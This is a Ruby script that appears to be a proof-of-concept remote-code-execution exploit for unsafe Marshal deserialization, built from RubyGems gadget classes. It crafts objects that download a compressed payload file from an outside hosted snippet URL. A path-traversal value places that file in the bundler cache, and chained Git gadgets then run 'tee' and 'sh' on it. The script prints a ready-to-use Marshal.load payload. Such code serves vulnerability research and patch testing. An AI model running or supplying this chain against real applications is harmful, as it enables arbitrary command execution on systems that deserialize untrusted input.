# Autoload the required classes
Gem::SpecFetcher

# create a file a.rz and host it somewhere accessible with https
def generate_rz_file(payload)
  require "zlib"
  spec = Marshal.dump(Gem::Specification.new("bundler"))

  out = Zlib::Deflate.deflate( spec + "\"]\n" + payload + "\necho ref;exit 0;\n")
  puts out.inspect

  File.write("a.rz", out)
end

def create_folder
  uri = URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", "gitlab.com/uploads/-/system/personal_snippet/2281350/9d3ba681a22b25b3ad9cf61ed22a9aaa/a.rz?")  # use the https host+path with your rz file
  uri.instance_variable_set("@port", "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301/")
  uri.instance_variable_set("@user", "user")
  uri.instance_variable_set("@password", "password")

  spec = Gem::Source.allocate
  spec.instance_variable_set("@uri", uri)
  spec.instance_variable_set("@update_cache", true)

  request = Gem::Resolver::IndexSpecification.allocate
  request.instance_variable_set("@name", "name")
  request.instance_variable_set("@source", spec)

  s = [request]

  r = Gem::RequestSet.allocate
  r.instance_variable_set("@sorted", s)

  l = Gem::RequestSet::Lockfile.allocate
  l.instance_variable_set("@set", r)
  l.instance_variable_set("@dependencies", [])

  l
end

def git_gadget(git, reference)
  gsg = Gem::Source::Git.allocate
  gsg.instance_variable_set("@git", git)
  gsg.instance_variable_set("@reference", reference)
  gsg.instance_variable_set("@root_dir","/tmp")
  gsg.instance_variable_set("@repository","vakzz")
  gsg.instance_variable_set("@name","aaa")

  basic_spec = Gem::Resolver::Specification.allocate
  basic_spec.instance_variable_set("@name","name")
  basic_spec.instance_variable_set("@dependencies",[])

  git_spec = Gem::Resolver::GitSpecification.allocate
  git_spec.instance_variable_set("@source", gsg)
  git_spec.instance_variable_set("@spec", basic_spec)

  spec = Gem::Resolver::SpecSpecification.allocate
  spec.instance_variable_set("@spec", git_spec)

  spec
end

def popen_gadget
  spec1 = git_gadget("tee", { in: "/tmp/cache/bundler/git/aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301/quick/Marshal.4.8/name-.gemspec"})
  spec2 = git_gadget("sh", {})

  s = [spec1, spec2]

  r = Gem::RequestSet.allocate
  r.instance_variable_set("@sorted", s)

  l = Gem::RequestSet::Lockfile.allocate
  l.instance_variable_set("@set", r)
  l.instance_variable_set("@dependencies",[])

  l
end

def to_s_wrapper(inner)
  s = Gem::Specification.new
  s.instance_variable_set("@new_platform", inner)
  s
end

folder_gadget = create_folder
exec_gadget = popen_gadget

r = Marshal.dump([Gem::SpecFetcher, to_s_wrapper(folder_gadget), to_s_wrapper(exec_gadget)])

puts r.inspect
puts %{Marshal.load(["#{r.unpack("H*")}"].pack("H*"))}